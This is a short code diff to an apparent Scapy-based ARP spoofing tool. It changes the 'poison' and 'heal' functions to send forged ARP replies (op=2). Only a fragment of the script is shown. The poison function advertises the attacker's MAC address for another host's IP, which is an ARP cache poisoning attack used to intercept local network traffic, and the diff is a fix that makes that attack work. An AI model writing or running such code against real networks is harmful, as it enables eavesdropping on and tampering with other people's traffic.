@@ -7,7 +7,7 @@ import os
 
 
 def poison(iface, iface_mac, target_ip, target_mac, source_ip):
-    packet = Ether() / ARP()
+    packet = Ether() / ARP(op=2)
     packet[Ether].src = iface_mac
     packet[ARP].hwsrc = iface_mac
     packet[ARP].psrc = source_ip
@@ -17,7 +17,7 @@ def poison(iface, iface_mac, target_ip, target_mac, source_ip):
 
 
 def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
-    packet = Ether() / ARP()
+    packet = Ether() / ARP(op=2)
     packet[Ether].src = iface_mac
     packet[ARP].hwsrc = source_mac
     packet[ARP].psrc = source_ip
